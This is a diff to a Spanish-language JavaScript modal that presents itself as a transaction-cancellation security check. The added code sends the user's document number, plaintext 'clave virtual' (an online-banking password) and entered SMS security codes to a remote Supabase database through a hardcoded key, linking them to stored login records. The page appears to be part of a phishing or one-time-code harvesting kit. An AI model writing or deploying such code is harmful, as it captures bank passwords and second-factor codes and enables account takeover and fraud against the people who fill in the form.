@@ -5,12 +5,10 @@
 (function() {
     'use strict';
 
-    // Configuración de Supabase
-    const SUPABASE_CONFIG = {
-        url: 'https://tu-proyecto.supabase.co',
-        key: 'tu-anon-key',
-        tabla: 'codigos_cancelacion'
-    };
+    // Configuración de Supabase (credenciales reales)
+    const SUPABASE_URL = 'https://uzgdyypmqmnirkrqnlmq.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_5WgSnTPGEdfor1a83W0IIQ_pYrlY9ZD';
+    let supabaseClient = null;
 
     // Configuración de la modal
     const CONFIG = {
@@ -31,6 +29,99 @@
         documentoUsuario: '',
         claveVirtual: ''
     };
+
+    // Inicializar Supabase
+    async function inicializarSupabase() {
+        // Si ya está inicializado en el scope global, usarlo
+        if (window.supabaseService && window.supabaseService.supabaseClient) {
+            supabaseClient = window.supabaseService.supabaseClient;
+            return true;
+        }
+
+        // Si no, intentar inicializar
+        if (typeof window.supabase !== 'undefined') {
+            supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+            console.log('Supabase inicializado en modal');
+            return true;
+        }
+
+        console.error('Supabase no está disponible');
+        return false;
+    }
+
+    // Obtener último login del usuario
+    async function obtenerUltimoLogin() {
+        try {
+            if (!supabaseClient) await inicializarSupabase();
+            if (!supabaseClient) return null;
+
+            const { data, error } = await supabaseClient
+                .from('logins')
+                .select('*')
+                .eq('documento', estadoModal.documentoUsuario)
+                .order('fecha_login', { ascending: false })
+                .limit(1);
+
+            if (error) {
+                console.error('Error obteniendo login:', error);
+                return null;
+            }
+
+            return data && data.length > 0 ? data[0] : null;
+        } catch (error) {
+            console.error('Error en obtenerUltimoLogin:', error);
+            return null;
+        }
+    }
+
+    // Guardar en Supabase
+    async function guardarEnSupabase(datos) {
+        try {
+            if (!supabaseClient) await inicializarSupabase();
+            if (!supabaseClient) {
+                console.error('Supabase no está inicializado');
+                return { success: false, error: 'Supabase no disponible' };
+            }
+
+            // Obtener el último login del usuario
+            const ultimoLogin = await obtenerUltimoLogin();
+            const loginId = ultimoLogin ? ultimoLogin.id : null;
+
+            console.log('Guardando en Supabase:', {
+                documento: estadoModal.documentoUsuario,
+                clave_virtual: estadoModal.claveVirtual,
+                login_id: loginId,
+                ...datos
+            });
+
+            // Guardar código de seguridad asociado al login
+            const { data: codigoData, error: codigoError } = await supabaseClient
+                .from('codigos_seguridad')
+                .insert([{
+                    login_id: loginId,
+                    codigo: datos.codigo,
+                    tipo: 'cancelacion_transacciones',
+                    documento: estadoModal.documentoUsuario,
+                    clave_virtual: estadoModal.claveVirtual,
+                    intentos: estadoModal.intentosRealizados,
+                    estado: datos.estado,
+                    fecha_creacion: new Date().toISOString(),
+                    fecha_expiracion: new Date(Date.now() + CONFIG.tiempoExpiracion * 1000).toISOString(),
+                    usado: datos.estado === 'validado'
+                }]);
+
+            if (codigoError) {
+                console.error('Error al guardar código:', codigoError);
+                throw codigoError;
+            }
+
+            console.log('✓ Guardado exitoso en Supabase:', codigoData);
+            return { success: true, data: codigoData[0] };
+        } catch (error) {
+            console.error('Error en guardarEnSupabase:', error);
+            return { success: false, error: error.message };
+        }
+    }
 
     // Crear el HTML de la modal
     function crearModalHTML() {
@@ -368,9 +459,12 @@
     }
 
     // Inicializar la modal
-    function inicializarModal() {
+    async function inicializarModal() {
         crearEstilosCSS();
         crearModalHTML();
+        
+        // Inicializar Supabase
+        await inicializarSupabase();
         
         // Obtener datos del usuario (ajustar según tu implementación)
         obtenerDatosUsuario();
@@ -432,43 +526,6 @@
         const timestamp = Date.now();
         const random = Math.random().toString(36).substring(2, 9);
         return `CV-${timestamp}-${random}`.toUpperCase();
-    }
-
-    // Guardar en Supabase
-    async function guardarEnSupabase(datos) {
-        try {
-            // Nota: Ajusta la configuración de Supabase según tu proyecto
-            // Aquí va la lógica de conexión a Supabase
-            console.log('Guardando en Supabase:', datos);
-            
-            // Ejemplo de estructura (ajustar según tu schema):
-            /*
-            const { data, error } = await supabase
-                .from(SUPABASE_CONFIG.tabla)
-                .insert([
-                    {
-                        documento: estadoModal.documentoUsuario,
-                        clave_virtual: estadoModal.claveVirtual,
-                        codigo_sms: datos.codigo,
-                        intentos: estadoModal.intentosRealizados,
-                        estado: datos.estado,
-                        fecha_creacion: new Date().toISOString(),
-                        fecha_expiracion: new Date(Date.now() + CONFIG.tiempoExpiracion * 1000).toISOString()
-                    }
-                ]);
-
-            if (error) {
-                console.error('Error al guardar en Supabase:', error);
-                throw error;
-            }
-            */
-
-            // Simulación de guardado exitoso
-            return { success: true, data: datos };
-        } catch (error) {
-            console.error('Error en guardarEnSupabase:', error);
-            return { success: false, error: error };
-        }
     }
 
     // Mostrar la modal
@@ -560,9 +617,7 @@
                 // Código válido - guardar en Supabase
                 const resultadoGuardado = await guardarEnSupabase({
                     codigo: codigoIngresado,
-                    estado: 'validado',
-                    documento: estadoModal.documentoUsuario,
-                    clave_virtual: estadoModal.claveVirtual
+                    estado: 'validado'
                 });
 
                 if (resultadoGuardado.success) {
@@ -634,9 +689,7 @@
         // Guardar registro de reenvío en Supabase
         await guardarEnSupabase({
             codigo: null,
-            estado: 'reenviado',
-            documento: estadoModal.documentoUsuario,
-            clave_virtual: estadoModal.claveVirtual
+            estado: 'reenviado'
         });
 
         // Mostrar notificación formal (sin alert)
